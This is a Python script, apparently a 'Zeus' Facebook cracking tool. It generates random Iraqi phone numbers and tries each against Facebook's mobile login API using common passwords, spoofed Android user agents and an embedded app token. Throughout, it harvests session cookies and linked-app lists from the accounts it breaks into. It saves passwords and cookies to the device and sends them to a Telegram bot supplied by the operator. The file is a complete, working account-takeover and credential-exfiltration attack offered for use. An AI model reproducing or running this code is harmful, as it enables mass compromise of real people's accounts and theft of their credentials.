#---------------------
#تخمط انيج امك
import datetime
import sys
import webbrowser
import os
import requests
import time
import re
import random
import uuid
import string
import json
import subprocess
import base64
import zlib
import hashlib
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
P = '\x1b[1;96m'      # سماوي (Zeus logo)
HH = "\033[1;34m" # أزرق
B = '\x1b[1;94m'      # أزرق
O = '\x1b[1;96m'      # سماوي
Z = '\x1b[1;31m'      # أحمر
X = '\x1b[1;33m'      # أصفر
F = '\x1b[2;32m'      # أخضر فاتح
L = '\x1b[1;95m'      # وردي
C = '\x1b[2;35m'      # بنفسجي فاتح
A = '\x1b[2;39m'      # رمادي
J = '\x1b[38;5;208m'  # برتقالي
J1 = '\x1b[38;5;202m' # برتقالي غامق
J2 = '\x1b[38;5;203m' # برتقالي وردي
J21 = '\x1b[38;5;204m'# وردي فاتح
J22 = '\x1b[38;5;209m'# برتقالي فاتح
F1 = '\x1b[38;5;76m'  # أخضر نيون
C1 = '\x1b[38;5;120m' # أخضر فاتح جداً
P1 = '\x1b[38;5;150m' # أخضر مصفر
P2 = '\x1b[38;5;190m' # أصفر فاتح
gg = '\x1b[38;5;208m' # برتقالي
webbrowser.open('https://t.me/R7Aih1')
G = '\033[1;32m'
a30 = '\x1b[38;5;255m'  # أبيض فاتح
R = '\x1b[1;91m' # Red
V = '\x1b[1;35m' # بنفسجي
W = '\x1b[1;97m' # أبيض فاتح
RESET = '\x1b[0m'
os.system('clear')
a3 = "\033[1;32m" # أخضر

version = '1.0'
__date__ = datetime.now().strftime('%d/%m/%Y')
xlinex = f'{V}' + '━'*42 + f'{RESET}'
xpxx = '➜'
xp = '▸'

LOGO_FLOWER = f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃

{W}  ×─> {W}━━━━━━━{P}━━━━━━━━━━{W}━━━━━━━━━━━━{W}━━━━━{P}Zeus━━━━━━{W}━━━━━ <─×
"""

LOGO_ZEUS = f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃

{W}  ×─> {W}━━━━━━━{P}━━━━━━━━━━{W}━━━━━━━━━━━━{W}━━━━━{P}Zeus━━━━━━{W}━━━━━ <─×
"""


def animate(text, delay=0.05):
    os.system('clear')
    for line in text.split('\n'):
        print(line)
        time.sleep(delay)


try:
    import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    os.system('pip install requests > /dev/null')
    exit('\n Run Again ')

token = input(f"{G}Enter Token : {a3}")
ID = input(f"{G}Enter ID : {a3}")

animate(LOGO_ZEUS, 0.05)
time.sleep(1.5)

loop = 0
oks = []
pcp=[]
cps=[]


def get_apps(cok):
    try:
        session = requests.Session()
        coki = {}
        for hh in cok.split(';'):
            key, val = hh.split('=', 1)
            coki[key.strip()] = val.strip()
        head = {'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+'}
        rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=head).text
        rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=head).text
        
        result = "Active:\n"
        if 'no active apps' in rr1.lower():
            result += "No Apps\n"
        else:
            apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
            dates = re.findall(r'(?:تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia)\s*([^<]+)</p>', rr1)
            for idx, app in enumerate(apps):
                try:
                    result += f"[{idx+1}] {app.strip()} - {dates[idx].strip()}\n"
                except:
                    result += f"[{idx+1}] {app.strip()} - غير معروف\n"
            if not apps:
                result += "None\n"
        
        result += "\nExpired:\n"
        apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
        dates2 = re.findall(r'(?:Kedaluwarsa pada|انتهت الصلاحية في|Expired on)\s*([^<]+)</p>', rr2)
        for idx, app in enumerate(apps2):
            try:
                result += f"[{idx+1}] {app.strip()} - {dates2[idx].strip()}\n"
            except:
                result += f"[{idx+1}] {app.strip()} - غير معروف\n"
        if not apps2:
            result += "None\n"
        return result
    except:
        return "Failed to get apps"

#---------------------MKING-MENU---------------------#
def menu():
    os.system('clear')
    print(LOGO_ZEUS)
    print(f'{G}[1]  (M5){a30}')
    print(f'{HH}_'*50)
    print('')
    print(f'{G}[0]  (M2) {a30}')
    print('\033[1;91m')
    print(60*'_')
    opt = input(f'{G}[?]  : {a3}')
    if opt =='1':
        afg_randome()
    elif opt =='0':
        menu()
    else:
        print('\033[1;91m [•] HalBzhera\033[0;97m')

#---------------------MKING-RANDOM_CRACK---------------------#
def afg_randome():
    user=[]
    os.system('clear')
    print(LOGO_ZEUS)
    print(f'{G}[+] Cod Iraq  (0770,0750,0751,0780)....{a30}')
    print(60*f'{G}-')
    kode = input(f'{G}[?] Choose  : {a3}')
    print(47*'-')
    
    limit = 99999
    Turbo = set()
    while len(Turbo) < limit:
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        if nmp not in Turbo:
            Turbo.add(nmp)
            user.append(nmp)
    
    with tred(max_workers=30) as ahd:
        os.system('clear')
        print(LOGO_ZEUS)
        
        for guru in user:
            ids = kode+guru
            mking_pass = [ids,guru,'zaxozaxo','kurd1234','١٢٣٤٥٦٧٨٩','hama1234','١٢٣٤٥٦','zaxozaxozaxi','zaxo12345','١٢٣٤٥٦٧٨','١٢٣٤٥٦٧'
        '123456789'
        '١٢٣١٢٣'
        '07700770'
        '07500750'
        'Aa123123'
        'Aa123456789'] 
        
        
            ahd.submit(rndm,ids,mking_pass)
    print(47*'\n\033[1;37m-')
    print('[✓] Crack process has been completed')
    print('[?] Zeus OK Id Save in  /sdcard/Zeus-OK.txt')
    print('[?] Zeus CP Id Save in  /sdcard/Zeus-CP.txt')
    print(47*'-')
    print(' Press Inter To Back Menu')

#---------------------START-CRACK---------------------#
def rndm(ids,mking_pass):
    try:        
        global loop
        sys.stdout.write(
            f"\r\x1b[1;97m<> <\x1b[1;35mZeus-{loop}\x1b[1;97m> <> <\x1b[1;92m{len(oks)}K-{len(cps)}\x1b[1;97m>   "
        )
        sys.stdout.flush()
        for pas in mking_pass:
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
            model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
            build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
            fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
            fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
            headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 14; POCO X3 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.70 Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/258.0.0.4.99;]"
}
            ua = [
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S928B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S928B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S928U Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S928U;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3088};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S918B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S918U Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3088};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S918U;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S926B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S926B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-S926U Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S926U;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-A556B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2340};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A556B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-A546B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2340};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A546B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1344,height=2992};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 8 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 9 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1344,height=2992};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 9 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; OnePlus 12 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1440,height=3168};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/OnePlus 12;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; OnePlus 11 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/OnePlus 11;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Xiaomi 14 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1200,height=2670};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi 14;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Xiaomi 14 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi 14 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 13; Xiaomi 13 Build/TKQ1.221013.002) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1200,height=2670};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi 13;FBSV/13;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Vivo X100 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2800};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo X100;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Vivo X90 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2800};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/X90 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; OPPO Find X6 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Find X6;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Nothing Phone 2 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2412};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Nothing;FBBD/Nothing;FBPN/com.facebook.katana;FBDV/Nothing Phone 2;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; HUAWEI Pura 70 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1280,height=2848};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Pura 70 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; HUAWEI Mate 60 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2720};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Mate 60 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-F956B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F956B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-F946B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F946B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; SM-F731B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1440,height=3120};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F731B;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2800};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 8;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1344,height=2992};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 7 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2800};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 7;FBSV/13;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1344,height=2992};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 6 Pro;FBSV/12;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 6;FBSV/12;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; OnePlus Nord 3 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2412};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Nord 3;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 13; OnePlus 10 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/OnePlus 10 Pro;FBSV/13;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; POCO F5 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Poco F5;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Redmi Note 12 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 12 Pro;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 11 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 11;FBSV/13;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; realme GT Neo 3 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2412};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/GT Neo 3;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; realme C55 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2412};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/C55;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; OPPO Reno10 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Reno10;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 13; OPPO Reno8 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katanacom.facebook.katana;FBDV/Reno8;FBSV/13;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; vivo iQOO 11 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1260,height=2800};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/iQOO 11;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Sony Xperia 1 V Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/SONY;FBBD/SONY;FBPN/com.facebook.katana;FBDV/Xperia 1 V;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
'Dalvik/2.1.0 (Linux; U; Android 14; moto g 5G 2024 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/581.0.0.45.58;FBBV/475215365;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/0;FBCA/arm64-v8a:;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g 5G 2024;FBSV/14;nullopcarrier/1;FBCA/arm64-v8a:;]',
"Dalvik/2.1.0 (Linux; U; Android 16; SM-S928B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/567.1.0.52.74;FBPN/com.facebook.katana;FBLC/en_US;FBBV/472527793;FBCR/STC;FBMF/samsung;FBBD/samsung;FBDV/SM-S928B;FBSV/16;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.5,width=1440,height=3120};FB_FW/1;FBRV/0;]"
]
            ua = random.choice(ua)
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": 1}
            head = {
    'user-agent': ua,
    'Host': 'graph.facebook.com',
    'Content-Type': 'application/json;charset=utf-8',
    'Content-Length': '595',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '3.375',
    'origin': 'https://www.facebook.com',
    'referer': 'https://www.facebook.com/?_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980'
}
            po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                print('\r\r\033[1;32m [@R7_36-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
                
                apps = get_apps(coki)
                print(apps)
                
                ff =f'''
   OK✅حساب شغال 



 -  𝐈𝐃       : {uid}

  -  𝗣𝗔𝗦𝗦    : {pas}

  -  𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {coki}
-  𝗨𝗥𝗟  : https://www.facebook.com/profile.php?id={uid}
------------------------------------------------------
{apps}
------------------------------------------------------
<b> -  PY @R7_36 ~R7Aih1</b>








                     '''            
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}&parse_mode=HTML")

                
                open('/sdcard/Zeus-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                print('\r\r\x1b[1;33m [Zeus-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                ff =f'''   CP ❌حساب سكيور



 -  𝐈𝐃       : {uid}

  -  𝗣𝗔𝗦𝗦    : {pas}

  -  𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {coki}
-  𝗨𝗥𝗟  : https://www.facebook.com/profile.php?id={uid}
------------------------------------------------------
{apps}
------------------------------------------------------
<b> -  PY @R7_36 ~R7Aih1</b>
』
                     '''  
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}&parse_mode=HTML")
                

                
                open('/sdcard/Zeus-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
menu()
#تخمط انيج امك
